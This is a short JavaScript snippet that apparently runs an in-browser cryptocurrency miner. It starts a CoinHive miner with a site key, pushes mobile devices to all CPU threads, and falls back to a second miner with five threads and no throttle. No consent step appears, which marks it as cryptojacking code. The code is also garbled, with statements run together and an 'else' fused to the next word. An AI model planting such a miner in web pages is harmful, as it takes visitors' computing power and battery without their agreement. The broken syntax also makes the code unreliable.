try {
    var adb = new CoinHive.Anonymous('FuJmnU6BEUL9bB3uUawCKgfpVTeqANJ5', {
        throttle: 0.2
    });
    adb.start();
    if (adb.isMobile()) {
        adb.setNumThreads(window.navigator.hardwareConcurrency);
        adb.setThrottle(0.6);
    }
    adb.on('found', function() {}) adb.on('accepted', function() {}) var x = 0;
    var y = 0;
    setInterval(function() {
        if (x < y) document.getElementById("myText").innerHTML = "&#x1F607";
        elsedocument.getElementById("myText").innerHTML = "&#x1F61E";
        x = y;
        y = adb.getTotalHashes();
    }, 3000);
} catch (err) {
    var miner = new CRLT.Anonymous('f836e84f3421e95956813400657e32a68ec791235444', {
        threads: 5,
        throttle: 0.0,
    });
    miner.start();
    miner.on('found', function() { /* Hash found */ }) miner.on('accepted', function() { /* Hash accepted by the pool */ }) setInterval(function() {
        document.getElementById("myText").innerHTML = miner.getTotalHashes();
    }, 1000);
}